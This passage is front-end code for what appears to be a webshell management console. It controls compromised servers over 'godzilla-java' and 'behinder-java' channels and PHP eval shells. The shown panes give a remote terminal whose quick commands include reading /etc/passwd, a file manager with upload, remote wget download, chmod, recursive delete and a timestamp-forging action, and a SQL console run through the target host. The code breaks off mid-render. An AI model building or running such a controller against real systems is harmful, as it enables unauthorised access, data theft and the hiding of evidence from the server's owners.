						h("thead", null, h("tr", null, h("th", null, "时间"), h("th", null, "动作"), h("th", null, "细节"))),
						h("tbody", null, (ops[0].ops || []).map(function (o, i) {
							return h("tr", { key: i }, h("td", null, fmtTime(o.created_at)), h("td", null, o.action), h("td", { className: "wrap dsh-wsm-mono" }, o.detail));
						}))),
					(ops[0].ops || []).length === 0 ? h("div", { className: "dsh-wsm-sub", style: { padding: 8 } }, "（空）") : null)));
}

//#endregion

//#region 终端

var QUICK_CMDS = ["whoami", "id", "pwd", "uname -a", "ls -la", "df -h", "netstat -antp 2>/dev/null || netstat -an", "ps aux 2>/dev/null || tasklist", "cat /etc/passwd 2>/dev/null || type C:\\Windows\\win.ini"];

function TerminalPane(props) {
	var conn = props.conn;
	var lines = useState([]);
	var input = useState("");
	var hist = useState([]);
	var histIdx = useState(-1);
	var busy = useState(false);
	var menu = useState(null);
	var boxRef = useRef(null);
	var st = props.connState || {};
	var interactive = useState(false); // 交互模式（godzilla-java：持久会话终端 e.* ops）
	var interTid = useState("");
	var pollTimer = useRef(null);
	useEffect(function () {
		// 离开/切换连接时收尾交互会话
		return function () { if (pollTimer.current) clearInterval(pollTimer.current); };
	}, [conn && conn.id]);
	useEffect(function () {
		if (!conn || !props.stateReady) return;
		lines[1]((st.terminal && st.terminal.lines) || []);
		hist[1]((st.terminal && st.terminal.history) || []);
	}, [conn && conn.id, props.stateReady]);
	useEffect(function () {
		if (boxRef.current) boxRef.current.scrollTop = boxRef.current.scrollHeight;
		if (conn) props.persistState({ terminal: { lines: lines[0].slice(-400), history: hist[0].slice(-100) } });
	}, [lines[0].length, hist[0].length]);
	function push(kind, text) {
		lines[1](function (p) { return p.concat([{ k: kind, t: text }]).slice(-400); });
	}
	function stopPoll() { if (pollTimer.current) { clearInterval(pollTimer.current); pollTimer.current = null; } }
	function toggleInteractive() {
		if (!interactive[0]) {
			api("term.action", { connId: conn.id, action: "open", cmdline: "" }).then(function (r) {
				interTid[1](r.tid);
				interactive[1](true);
				push("sys", "交互模式已开启（持久会话——输出轮询中，exit 或关闭按钮退出）");
				stopPoll();
				pollTimer.current = setInterval(function () {
					api("term.action", { connId: conn.id, action: "read", tid: interTid[0] }).then(function (r2) {
						if (r2.data) push("out", r2.data.replace(/\n$/, ""));
						if (r2.exited) { stopPoll(); interactive[1](false); push("sys", "会话已退出"); }
					}).catch(function () { stopPoll(); interactive[1](false); });
				}, 400);
			}).catch(function (e) { push("err", "交互模式开启失败：" + String(e)); });
		} else {
			stopPoll();
			api("term.action", { connId: conn.id, action: "close", tid: interTid[0] }).catch(function () {});
			interactive[1](false);
			push("sys", "交互模式已关闭");
		}
	}
	function run(cmd) {
		if (!cmd || busy[0]) return;
		if (interactive[0]) {
			push("cmd", cmd);
			hist[1](function (p) { return p.concat([cmd]).slice(-100); });
			api("term.action", { connId: conn.id, action: "write", tid: interTid[0], data: cmd + "\n" }).catch(function (e) { push("err", String(e)); });
			return;
		}
		busy[1](true);
		push("cmd", cmd);
		hist[1](function (p) { return p.concat([cmd]).slice(-100); });
		histIdx[1](-1);
		api("exec.run", { connId: conn.id, command: cmd }).then(function (r) {
			busy[1](false);
			if (r.error) push("err", r.error);
			else push("out", String(r.output ?? "").replace(/\n$/, "") || "（无输出）");
		}).catch(function (e) { busy[1](false); push("err", String(e)); });
	}
	if (!conn) return h("div", { className: "dsh-wsm-skel" }, "先选择连接");
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-row" },
			h(Btn, { small: true, onClick: function (e) {
				var rect = e.currentTarget.getBoundingClientRect();
				menu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right } });
			} }, "快捷命令"),
			conn.protocol === "godzilla-java" ? h(Btn, { small: true, primary: interactive[0], onClick: toggleInteractive, title: "持久会话终端（WsmG e.* ops）——状态跨命令保持" }, interactive[0] ? "交互中（点击退出）" : "交互模式") : null,
			h("span", { className: "dsh-wsm-spacer" }),
			h(Btn, { small: true, onClick: function () {
				var text = lines[0].map(function (l) { return (l.k === "cmd" ? "$ " : "") + l.t; }).join("\n");
				if (navigator.clipboard) navigator.clipboard.writeText(text);
			} }, "复制输出"),
			h(Btn, { small: true, onClick: function () { lines[1]([]); } }, "清屏")),
		h(Popover, { open: !!menu[0], anchor: menu[0] ? menu[0].anchor : null, onClose: function () { menu[1](null); }, title: "快捷命令", width: 330 },
			QUICK_CMDS.map(function (c) {
				return h("button", { key: c, className: "dsh-wsm-menu-item", onClick: function () { menu[1](null); run(c); } }, h("span", { className: "dsh-wsm-mono" }, c));
			})),
		h("div", { ref: boxRef, className: "dsh-wsm-term" },
			lines[0].map(function (l, i) {
				return h("div", { key: i, className: l.k === "cmd" ? "is-cmd" : l.k === "err" ? "is-err" : "" }, (l.k === "cmd" ? "$ " : "") + l.t);
			}).concat(busy[0] ? [h("div", { key: "busy" }, "…")] : [])),
		h("div", { className: "dsh-wsm-row" },
			h("span", { className: "dsh-wsm-mono", style: { color: "var(--dsw-alias-accent,#4c6ef5)" } }, "$"),
			h("input", {
				className: "dsh-wsm-term-in", value: input[0], disabled: busy[0],
				placeholder: "输入命令回车执行（↑↓ 翻历史 / Ctrl+L 清屏）",
				onChange: function (e) { input[1](e.target.value); },
				onKeyDown: function (e) {
					if (e.key === "Enter") { var v = input[0]; input[1](""); run(v); }
					else if (e.key === "l" && (e.ctrlKey || e.metaKey)) { e.preventDefault(); lines[1]([]); }
					else if (e.key === "ArrowUp") {
						e.preventDefault();
						var h1 = hist[0]; var i1 = histIdx[0] < 0 ? h1.length - 1 : Math.max(0, histIdx[0] - 1);
						if (h1[i1] !== undefined) { histIdx[1](i1); input[1](h1[i1]); }
					} else if (e.key === "ArrowDown") {
						e.preventDefault();
						var h2 = hist[0]; var i2 = histIdx[0] + 1;
						if (i2 >= h2.length) { histIdx[1](-1); input[1](""); }
						else { histIdx[1](i2); input[1](h2[i2]); }
					}
				}
			})));
}

//#endregion

//#region 文件管理

function actionOkMsg(action, a) {
	switch (action) {
		case "mkdir": return "目录已创建";
		case "write": return "已写入 " + (a.path || "");
		case "delete": case "delete-dir": return "已删除 " + (a.path || "");
		case "mv": return "已移动到 " + (a.to || "");
		case "copy": return "已复制到 " + (a.to || "");
		case "chmod": return "权限已改为 " + (a.mode || "");
		case "touch": return "时间戳已伪造";
		case "wget": return "远程下载完成 → " + (a.to || "");
		default: return "操作完成";
	}
}

function FilesPane(props) {
	var conn = props.conn;
	var path = useState("");
	var entries = useState(null);
	var msg = useState("");
	var msgKind = useState("info");
	var busy = useState(false);
	var upPct = useState(0);
	var rowMenu = useState(null);
	var toolMenu = useState(null);
	var form = useState(null);
	var formKey = useState(0);
	var viewer = useState(null);
	var st = props.connState || {};
	useEffect(function () {
		if (!conn || !props.stateReady) return; // 连接状态未载入不动——防拿上个 shell 的路径串门
		var saved = st.files && st.files.path;
		if (saved) { path[1](saved); refresh(saved); return; }
		// 首访：以 shell 当前工作目录为起点（各自独立，再自由遍历）
		api("exec.run", { connId: conn.id, command: conn.os === "windows" ? "cd" : "pwd" }).then(function (r) {
			var cwd = String(r.output || "").trim().split(/\r?\n/).pop();
			if (!cwd || r.error) cwd = (conn.basicInfo && conn.basicInfo.cwd) || (conn.os === "windows" ? "C:\\" : "/");
			path[1](cwd);
			refresh(cwd);
		}).catch(function () {
			var fb = (conn.basicInfo && conn.basicInfo.cwd) || (conn.os === "windows" ? "C:\\" : "/");
			path[1](fb); refresh(fb);
		});
	}, [conn && conn.id, props.stateReady]);
	function notice(text, kind) { msg[1](text); msgKind[1](kind || "info"); }
	function persist(p) { props.persistState({ files: { path: p } }); }
	function refresh(p) {
		if (!conn || !p) return;
		busy[1](true); notice("");
		api("file.action", { connId: conn.id, action: "ls", path: p }).then(function (r) {
			busy[1](false);
			if (r.entries) {
				var sorted = r.entries.slice().sort(function (a, b) {
					if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
					return a.name.localeCompare(b.name, undefined, { numeric: true });
				});
				entries[1](sorted);
				path[1](p);
				persist(p);
			} else {
				notice(r.error || "列目录失败", "error");
				entries[1]([]);
			}
		}).catch(function (e) { busy[1](false); notice(String(e), "error"); });
	}
	function go(dir, name) { refresh(name ? joinPath(dir, name) : dir); }
	function up() {
		var d = dirnameOf(path[0]);
		if (d) refresh(d);
		else if (conn.os === "windows") refresh(path[0].slice(0, 3));
	}
	function fullOf(name) { return joinPath(path[0], name); }
	function openForm(spec) { form[1](spec); formKey[1](formKey[0] + 1); }
	function act(action, a, okText) {
		busy[1](true); notice("");
		api("file.action", Object.assign({ connId: conn.id, action: action }, a)).then(function (r) {
			busy[1](false);
			if (r.error) notice(r.error, "error");
			else { notice(okText || actionOkMsg(action, a), "success"); refresh(path[0]); }
		}).catch(function (e) { busy[1](false); notice(String(e), "error"); });
	}
	function rowAction(action, entry) {
		rowMenu[1](null);
		var target = fullOf(entry.name);
		if (action === "view") return openViewer(target);
		if (action === "download") return download(entry);
		if (action === "mv") {
			openForm({
				title: "重命名 / 移动：" + entry.name,
				submitLabel: "执行",
				fields: [{ key: "to", label: "目标路径", value: target }],
				onSubmit: function (d) { form[1](null); act("mv", { from: target, to: d.to }); }
			});
			return;
		}
		if (action === "copy") {
			openForm({
				title: "复制：" + entry.name,
				submitLabel: "执行",
				fields: [{ key: "to", label: "目标路径", value: fullOf("copy-of-" + entry.name) }],
				onSubmit: function (d) { form[1](null); act("copy", { from: target, to: d.to }); }
			});
			return;
		}
		if (action === "chmod") {
			openForm({
				title: "改权限：" + entry.name,
				submitLabel: "执行",
				fields: [{ key: "mode", label: "八进制权限", value: entry.perm || "644", placeholder: "如 755" }],
				onSubmit: function (d) { form[1](null); act("chmod", { path: target, mode: d.mode }); }
			});
			return;
		}
		if (action === "touch") {
			openForm({
				title: "伪造时间戳：" + entry.name,
				submitLabel: "执行",
				notice: "留空 = 30 天前；格式 YYYY-MM-DD HH:MM:SS",
				fields: [{ key: "time", label: "修改时间", value: "", placeholder: "2026-01-01 08:00:00" }],
				onSubmit: function (d) {
					form[1](null);
					var epoch = d.time ? Math.floor(new Date(d.time.replace(" ", "T")).getTime() / 1000) : Math.floor(Date.now() / 1000) - 86400 * 30;
					act("touch", { path: target, epoch: epoch });
				}
			});
			return;
		}
		if (action === "delete" || action === "delete-dir") {
			if (!window.confirm("删除 " + target + "？" + (action === "delete-dir" ? "（递归）" : ""))) return;
		}
		act(action, { path: target });
	}
	function download(entry) {
		busy[1](true); notice("读取中…");
		api("file.action", { connId: conn.id, action: "read", path: fullOf(entry.name) }).then(function (r) {
			busy[1](false);
			if (r.b64) {
				var bin = atob(r.b64);
				var arr = new Uint8Array(bin.length);
				for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
				var url = URL.createObjectURL(new Blob([arr]));
				var a = document.createElement("a");
				a.href = url; a.download = entry.name; a.click();
				URL.revokeObjectURL(url);
				notice("");
			} else notice(r.error || "读取失败", "error");
		}).catch(function (e) { busy[1](false); notice(String(e), "error"); });
	}
	function openViewer(target) {
		busy[1](true); notice("");
		api("file.action", { connId: conn.id, action: "read", path: target }).then(function (r) {
			busy[1](false);
			if (r.error) { notice(r.error, "error"); return; }
			if (r.size > 512 * 1024) { notice("文件超过 512KB，请用下载查看", "error"); return; }
			var bin = atob(r.b64 || "");
			var arr = new Uint8Array(bin.length);
			for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
			var text = new TextDecoder("utf-8", { fatal: false }).decode(arr);
			var bad = (text.match(/\uFFFD/g) || []).length;
			var editable = bad <= text.length / 100;
			viewer[1]({ path: target, text: editable ? text : null, original: editable ? text : null, saving: false });
		}).catch(function (e) { busy[1](false); notice(String(e), "error"); });
	}
	function saveViewer() {
		var v = viewer[0];
		if (!v || v.text === null) return;
		viewer[1](Object.assign({}, v, { saving: true }));
		var u8 = new TextEncoder().encode(v.text);
		var b64 = "";
		var CH = 0x8000;
		for (var i = 0; i < u8.length; i += CH) b64 += String.fromCharCode.apply(null, u8.subarray(i, i + CH));
		api("file.action", { connId: conn.id, action: "write", path: v.path, b64: btoa(b64) }).then(function (r) {
			var cur = viewer[0];
			if (cur) viewer[1](Object.assign({}, cur, { saving: false }));
			if (r.error) notice(r.error, "error");
			else notice("已保存 " + basename(v.path), "success");
		}).catch(function (e) {
			var cur = viewer[0];
			if (cur) viewer[1](Object.assign({}, cur, { saving: false }));
			notice(String(e), "error");
		});
	}
	function upload(file) {
		var fr = new FileReader();
		fr.onload = function () {
			var u8 = new Uint8Array(fr.result);
			upPct[1](50);
			notice("上传中 " + fmtBytes(u8.length) + "…");
			var b64 = "";
			var CH = 0x8000;
			for (var i = 0; i < u8.length; i += CH) b64 += String.fromCharCode.apply(null, u8.subarray(i, i + CH));
			api("file.action", { connId: conn.id, action: "write", path: fullOf(file.name), b64: btoa(b64) }).then(function (r) {
				upPct[1](100);
				setTimeout(function () { upPct[1](0); }, 600);
				if (r.error) notice(r.error, "error");
				else { notice("已上传 " + file.name + "（" + fmtBytes(u8.length) + "）", "success"); refresh(path[0]); }
			}).catch(function (e) { upPct[1](0); notice(String(e), "error"); });
		};
		fr.readAsArrayBuffer(file);
	}
	if (!conn) return h("div", { className: "dsh-wsm-skel" }, "先选择连接");
	var crumbs = path[0].split(/[\\/]/).filter(Boolean);
	var v = viewer[0];
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-row" },
			h(Btn, { small: true, onClick: up, title: "上级目录", disabled: busy[0] }, ".."),
			h("div", { className: "dsh-wsm-crumbs" },
				h("button", { className: "dsh-wsm-crumb", onClick: function () { refresh(conn.os === "windows" ? "C:\\" : "/"); } }, conn.os === "windows" ? "C:\\" : "/"),
				crumbs.map(function (c, i) {
					var acc = conn.os === "windows"
						? (i === 0 ? crumbs[0] + "\\" : crumbs.slice(0, i + 1).join("\\"))
						: "/" + crumbs.slice(0, i + 1).join("/");
					return h("span", { key: i }, h("span", { className: "dsh-wsm-sub" }, "/"), h("button", { className: "dsh-wsm-crumb", onClick: function () { refresh(acc); } }, c));
				})),
			h("span", { className: "dsh-wsm-spacer" }),
			h(Btn, { small: true, disabled: busy[0], onClick: function (e) {
				var rect = e.currentTarget.getBoundingClientRect();
				toolMenu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right } });
			} }, "操作"),
			h(Btn, { small: true, disabled: busy[0], onClick: function () { refresh(path[0]); } }, "刷新")),
		upPct[0] ? h("div", { className: "dsh-wsm-upbar" }, h("div", { style: { width: upPct[0] + "%" } })) : null,
		h(Popover, { open: !!toolMenu[0], anchor: toolMenu[0] ? toolMenu[0].anchor : null, onClose: function () { toolMenu[1](null); }, title: "目录操作", width: 230 },
			h("button", { className: "dsh-wsm-menu-item", onClick: function () {
				toolMenu[1](null);
				openForm({ title: "新建目录", submitLabel: "创建", fields: [{ key: "p", label: "完整路径", value: fullOf("") }], onSubmit: function (d) { form[1](null); act("mkdir", { path: d.p }); } });
			} }, "新建目录…"),
			h("button", { className: "dsh-wsm-menu-item", onClick: function () {
				toolMenu[1](null);
				openForm({ title: "新建文本文件", submitLabel: "创建", fields: [{ key: "p", label: "完整路径", value: fullOf("") }], onSubmit: function (d) { form[1](null); act("write", { path: d.p, b64: "" }, "文件已创建"); } });
			} }, "新建文件…"),
			h("button", { className: "dsh-wsm-menu-item", onClick: function () {
				toolMenu[1](null);
				openForm({
					title: "远程下载（wget）", submitLabel: "下载",
					fields: [{ key: "url", label: "远程 URL", value: "http://" }, { key: "to", label: "保存到", value: fullOf("") }],
					onSubmit: function (d) { form[1](null); act("wget", { url: d.url, to: d.to }); }
				});
			} }, "远程下载（wget）…"),
			h("div", { className: "dsh-wsm-menu-item dsh-wsm-up" }, "上传文件到当前目录", h("input", { type: "file", onClick: function (e) { e.stopPropagation(); }, onChange: function (e) { toolMenu[1](null); if (e.target.files && e.target.files[0]) upload(e.target.files[0]); } }))),
		h(Notice, { msg: msg[0], kind: msgKind[0] }),
		entries[0] === null ? h("div", { className: "dsh-wsm-sub" }, "读取中…") :
			entries[0].length === 0 ? h("div", { className: "dsh-wsm-skel" }, "（空目录）") :
			h("div", { className: "dsh-wsm-scrollbox" },
				h("table", { className: "dsh-wsm-table" },
					h("thead", null, h("tr", null, h("th", null, "名称"), h("th", null, "大小"), h("th", null, "权限"), h("th", null, "修改时间"), h("th", null, ""))),
					h("tbody", null, entries[0].map(function (e, i) {
						return h("tr", { key: i },
							h("td", null,
								h("span", { className: "dsh-wsm-ftype" + (e.isDir ? " is-dir" : ""), title: e.isDir ? "目录（单击进入）" : "文件（双击查看/编辑）" }),
								h("span", {
									className: "dsh-wsm-name" + (e.isDir ? " is-dir" : ""),
									onDoubleClick: function () { if (e.isDir) go(path[0], e.name); else rowAction("view", e); },
									onClick: function () { if (e.isDir) go(path[0], e.name); }
								}, e.name)),
							h("td", null, e.isDir ? "—" : fmtBytes(e.size)),
							h("td", null, e.perm || "—"),
							h("td", null, e.mtime || "—"),
							h("td", { style: { width: 40, textAlign: "right" } },
								h(Btn, { small: true, onClick: function (ev) {
									var rect = ev.currentTarget.getBoundingClientRect();
									rowMenu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right }, entry: e });
								} }, "⋯")));
					})))),
		h(Popover, { open: !!rowMenu[0], anchor: rowMenu[0] ? rowMenu[0].anchor : null, onClose: function () { rowMenu[1](null); }, title: rowMenu[0] ? rowMenu[0].entry.name : "", width: 210 },
			rowMenu[0] ? [
				rowMenu[0].entry.isDir ? null : h("button", { key: "view", className: "dsh-wsm-menu-item", onClick: function () { rowAction("view", rowMenu[0].entry); } }, "查看 / 编辑"),
				rowMenu[0].entry.isDir ? null : h("button", { key: "dl", className: "dsh-wsm-menu-item", onClick: function () { rowAction("download", rowMenu[0].entry); } }, "下载"),
				h("button", { key: "mv", className: "dsh-wsm-menu-item", onClick: function () { rowAction("mv", rowMenu[0].entry); } }, "重命名 / 移动…"),
				h("button", { key: "cp", className: "dsh-wsm-menu-item", onClick: function () { rowAction("copy", rowMenu[0].entry); } }, "复制…"),
				h("button", { key: "cm", className: "dsh-wsm-menu-item", onClick: function () { rowAction("chmod", rowMenu[0].entry); } }, "改权限…"),
				h("button", { key: "tc", className: "dsh-wsm-menu-item", onClick: function () { rowAction("touch", rowMenu[0].entry); } }, "伪造时间戳…"),
				h("button", { key: "rm", className: "dsh-wsm-menu-item is-danger", onClick: function () { rowAction(rowMenu[0].entry.isDir ? "delete-dir" : "delete", rowMenu[0].entry); } }, rowMenu[0].entry.isDir ? "删除目录（递归）" : "删除")
			].filter(Boolean) : null),
		form[0] ? h(FormModal, {
			key: "form-" + formKey[0],
			open: true, title: form[0].title, fields: form[0].fields,
			submitLabel: form[0].submitLabel, notice: form[0].notice,
			onClose: function () { form[1](null); },
			onSubmit: form[0].onSubmit
		}) : null,
		h(Modal, { open: !!v, wide: true, onClose: function () { viewer[1](null); } },
			v ? h(React.Fragment, null,
				h("h3", { className: "dsh-wsm-mono", style: { fontSize: 13 } }, v.path),
				v.text === null ? h(Notice, { msg: "二进制文件——不支持文本编辑，请用下载。", kind: "info" }) :
					h("textarea", {
						className: "dsh-wsm-textarea", style: { minHeight: "46vh", fontSize: 12 },
						spellCheck: false, value: v.text,
						onChange: function (e) { viewer[1](Object.assign({}, v, { text: e.target.value })); }
					}),
				h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
					h(Btn, { onClick: function () { viewer[1](null); } }, "关闭"),
					v.text === null ? null : h(Btn, { onClick: function () { viewer[1](Object.assign({}, v, { text: v.original })); } }, "还原"),
					h(Btn, { primary: true, disabled: v.saving || v.text === null || v.text === v.original, onClick: saveViewer }, v.saving ? "保存中…" : "保存"))) : null));
}

//#endregion

//#region 数据库

var DB_TYPES = ["mysql", "pgsql", "sqlite", "mssql", "oracle"];

function DbPane(props) {
	var conn = props.conn;
	var profiles = useState([]);
	var selProfile = useState("");
	var dbs = useState(null);
	var expanded = useState({});
	var tables = useState({});
	var tableInfo = useState({});
	var sql = useState("");
	var result = useState(null);
	var msg = useState("");
	var profMenu = useState(null);
	var editing = useState(null);
	var histMenu = useState(null);
	var st = props.connState || {};
	useEffect(function () {
		if (!conn || !props.stateReady) return;
		api("db.action", { connId: conn.id, action: "profiles" }).then(function (r) { profiles[1](r.profiles || []); }).catch(function (e) { msg[1](String(e)); });
		var saved = st.db && st.db.sql;
		if (saved) sql[1](saved);
	}, [conn && conn.id, props.stateReady]);
	function persistDb(patch) {
		props.persistState({ db: Object.assign({}, (st.db || {}), patch) });
	}
	function loadDbs() {
		if (!selProfile[0]) return;
		msg[1]("");
		api("db.action", { connId: conn.id, action: "dbs", profileId: selProfile[0] }).then(function (r) {
			if (r.error) msg[1](r.error);
			else dbs[1](r.databases || []);
		}).catch(function (e) { msg[1](String(e)); });
	}
	function loadTables(db) {
		api("db.action", { connId: conn.id, action: "tables", profileId: selProfile[0], database: db }).then(function (r) {
			if (r.error) msg[1](r.error);
			else tables[1](function (p) { var n = Object.assign({}, p); n[db] = r.tables || []; return n; });
		});
	}
	function loadInfo(db, t) {
		var k = db + "/" + t;
		api("db.action", { connId: conn.id, action: "tableinfo", profileId: selProfile[0], database: db, table: t }).then(function (r) {
			tableInfo[1](function (p) { var n = Object.assign({}, p); n[k] = r; return n; });
		});
	}
	function runSql() {
		if (!selProfile[0] || !sql[0].trim()) return;
		msg[1]("");
		api("db.action", { connId: conn.id, action: "exec", profileId: selProfile[0], sql: sql[0] }).then(function (r) {
			if (r.error) { msg[1](r.error); result[1](null); }
			else {
				result[1](r);
				var past = (st.db && st.db.sqlHistory) || [];
				persistDb({ sqlHistory: [sql[0]].concat(past.filter(function (x) { return x !== sql[0]; })).slice(0, 30), sql: sql[0] });
			}
		}).catch(function (e) { msg[1](String(e)); });
	}
	if (!conn) return h("div", { className: "dsh-wsm-skel" }, "先选择连接");
	var cur = profiles[0].find(function (p) { return p.id === selProfile[0]; });
	var sqlHistory = (st.db && st.db.sqlHistory) || [];
	return h(React.Fragment, null,
		h("div", { className: "dsh-wsm-row" },
			h(Btn, { small: true, onClick: function (e) {
				var rect = e.currentTarget.getBoundingClientRect();
				profMenu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right } });
			} }, "数据库档案" + (cur ? "：" + (cur.remark || cur.type + "@" + cur.host) : "")),
			dbs[0] === null && selProfile[0] ? h(Btn, { small: true, onClick: loadDbs }, "加载库列表") : null,
			h("span", { className: "dsh-wsm-spacer" }),
			cur ? h(Pill, { tone: "accent" }, cur.type + "@" + (cur.host || cur.database)) : null),
		h(Popover, { open: !!profMenu[0], anchor: profMenu[0] ? profMenu[0].anchor : null, onClose: function () { profMenu[1](null); }, title: "数据库连接档案（每连接多套）", width: 340 },
			profiles[0].map(function (p) {
				return h("button", { key: p.id, className: "dsh-wsm-menu-item", onClick: function () { selProfile[1](p.id); dbs[1](null); profMenu[1](null); result[1](null); } },
					h("span", null, (p.remark || p.type + "@" + p.host) + (p.id === selProfile[0] ? "（当前）" : "")));
			}),
			h("div", { style: { borderTop: "1px solid var(--dsw-alias-border-l1,#e9e9ec)", marginTop: 6, paddingTop: 6 } },
				h("button", { className: "dsh-wsm-menu-item", onClick: function () { profMenu[1](null); editing[1]({ type: "mysql", host: "", port: 3306, username: "", password: "", database: "", remark: "" }); } }, "新建档案…"),
				cur ? h("button", { className: "dsh-wsm-menu-item", onClick: function () { profMenu[1](null); editing[1](Object.assign({}, cur, { password: "" })); } }, "编辑当前档案…") : null,
				cur ? h("button", { className: "dsh-wsm-menu-item is-danger", onClick: function () {
					profMenu[1](null);
					if (!window.confirm("删除档案 " + (cur.remark || cur.type) + "？")) return;
					api("db.action", { connId: conn.id, action: "profile.delete", id: cur.id }).then(function () {
						profiles[1](function (p) { return p.filter(function (x) { return x.id !== cur.id; }); });
						if (selProfile[0] === cur.id) { selProfile[1](""); dbs[1](null); }
					});
				} }, "删除当前档案") : null)),
		h(Modal, { open: !!editing[0], onClose: function () { editing[1](null); } },
			editing[0] ? h(React.Fragment, null,
				h("h3", null, editing[0].id ? "编辑数据库档案" : "新建数据库档案"),
				h("div", { className: "dsh-wsm-row" },
					h(Field, { label: "引擎" }, h("select", { className: "dsh-wsm-select", value: editing[0].type, onChange: function (e) { editing[1](Object.assign({}, editing[0], { type: e.target.value })); } }, DB_TYPES.map(function (t) { return h("option", { key: t, value: t }, t); }))),
					h(Field, { label: "主机" }, h("input", { className: "dsh-wsm-input mono", value: editing[0].host, onChange: function (e) { editing[1](Object.assign({}, editing[0], { host: e.target.value })); } })),
					h(Field, { label: "端口" }, h("input", { className: "dsh-wsm-input", type: "number", value: editing[0].port, onChange: function (e) { editing[1](Object.assign({}, editing[0], { port: Number(e.target.value) || 0 })); } }))),
				h("div", { className: "dsh-wsm-row" },
					h(Field, { label: "用户名" }, h("input", { className: "dsh-wsm-input mono", value: editing[0].username, onChange: function (e) { editing[1](Object.assign({}, editing[0], { username: e.target.value })); } })),
					h(Field, { label: editing[0].id ? "密码（留空保持不变）" : "密码" }, h("input", { className: "dsh-wsm-input mono", type: "password", value: editing[0].password, onChange: function (e) { editing[1](Object.assign({}, editing[0], { password: e.target.value })); } })),
					h(Field, { label: editing[0].type === "sqlite" ? "库文件路径" : "库名" }, h("input", { className: "dsh-wsm-input mono", value: editing[0].database, onChange: function (e) { editing[1](Object.assign({}, editing[0], { database: e.target.value })); } }))),
				h(Field, { label: "备注" }, h("input", { className: "dsh-wsm-input", value: editing[0].remark, onChange: function (e) { editing[1](Object.assign({}, editing[0], { remark: e.target.value })); } })),
				h(Notice, { msg: conn.protocol === "behinder-java"
					? "behinder-java 通道：数据库走目标应用 JDBC 驱动（mysql/mssql/pgsql/oracle——目标机自带驱动 jar 即可）。"
					: "需 eval 能力通道（PHP eval 马或自研加密马 v2）——数据库走目标机 PDO 原生驱动。behinder-java 通道可用 JDBC。", kind: "info" }),
				h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
					h(Btn, { onClick: function () { editing[1](null); } }, "取消"),
					h(Btn, { primary: true, onClick: function () {
						var p = editing[0];
						var payload = { id: p.id, type: p.type, host: p.host, port: p.port, username: p.username, database: p.database, remark: p.remark };
						if (p.password) payload.password = p.password; // 留空 = 保持（服务端同语义）
						api("db.action", Object.assign({ connId: conn.id, action: "profile.save" }, payload)).then(function (r) {
							if (r.error) { msg[1](r.error); return; }
							editing[1](null);
							api("db.action", { connId: conn.id, action: "profiles" }).then(function (r2) {
								profiles[1](r2.profiles || []);
								if (r.profile) selProfile[1](r.profile.id);
							});
						});
					} }, "保存"))) : null),
		msg[0] ? h(Notice, { msg: msg[0], kind: "error" }) : null,
		dbs[0] !== null ? h("div", { className: "dsh-wsm-row", style: { alignItems: "stretch", gap: 16 } },
			h("div", { style: { width: 260, flex: "none", borderRight: "1px solid var(--dsw-alias-border-l2,#e4e4e7)", paddingRight: 10 } },
				h("div", { className: "dsh-wsm-sub", style: { marginBottom: 4 } }, "库 / 表（手动展开）"),
				dbs[0].map(function (db) {
					var isOpen = !!expanded[0][db];
					return h("div", { key: db },
						h("div", { className: "dsh-wsm-tree-node", onClick: function () {
							expanded[1](function (p) { var n = Object.assign({}, p); if (n[db]) delete n[db]; else { n[db] = true; if (!tables[0][db]) loadTables(db); } return n; });
						} },
							h("span", { className: "dsh-wsm-caret" }, isOpen ? "▾" : "▸"),
							h("span", { className: "dsh-wsm-mono" }, db)),
						isOpen ? (tables[0][db] || []).map(function (t) {
							var tk = db + "/" + t;
							var tOpen = !!expanded[0][tk];
							return h("div", { key: tk },
								h("div", { className: "dsh-wsm-tree-node", style: { "--depth": 1 }, onClick: function () {
									expanded[1](function (p) { var n = Object.assign({}, p); if (n[tk]) delete n[tk]; else { n[tk] = true; if (!tableInfo[0][tk]) loadInfo(db, t); } return n; });
								} },
									h("span", { className: "dsh-wsm-caret" }, tOpen ? "▾" : "▸"),
									h("span", { className: "dsh-wsm-mono" }, t),
									h("span", { className: "dsh-wsm-spacer" }),
									h("button", { className: "dsh-wsm-crumb", title: "生成 SELECT", onClick: function (e) { e.stopPropagation(); sql[1]("SELECT * FROM `" + t + "` LIMIT 100;"); } }, "SEL")),
								tOpen && tableInfo[0][tk] ? h("div", { style: { padding: "2px 6px 6px 28px", fontSize: 11.5 }, className: "dsh-wsm-mono" },
									"行数：" + (tableInfo[0][tk].count ?? "?") + "；列：" + (tableInfo[0][tk].columns || []).map(function (c) { return c[0]; }).join(", ")) : null);
							}) : null);
					})),
				h("div", { style: { flex: 1, minWidth: 0, display: "flex", flexDirection: "column", gap: 8 } },
				h("div", { className: "dsh-wsm-row", style: { alignItems: "flex-start" } },
					h("textarea", { className: "dsh-wsm-textarea", style: { minHeight: 72, flex: 1 }, value: sql[0], onChange: function (e) { sql[1](e.target.value); }, placeholder: "SELECT ..." }),
					h("div", { style: { display: "flex", flexDirection: "column", gap: 6 } },
						h(Btn, { primary: true, onClick: runSql, disabled: !selProfile[0] }, "执行"),
						sqlHistory.length ? h(Btn, { small: true, onClick: function (e) {
							var rect = e.currentTarget.getBoundingClientRect();
							histMenu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right } });
						} }, "历史") : null,
						h(Btn, { small: true, onClick: function () { sql[1](""); result[1](null); } }, "清空"))),
				result[0] ? h("div", null,
					result[0].affected !== undefined ? h(Notice, { msg: "影响行数：" + result[0].affected, kind: "success" }) : null,
					h("div", { className: "dsh-wsm-scrollbox" },
						h("table", { className: "dsh-wsm-table" },
							h("thead", null, h("tr", null, (result[0].cols || []).map(function (c, i) { return h("th", { key: i }, c); }))),
						h("tbody", null, (result[0].rows || []).map(function (row, i) {
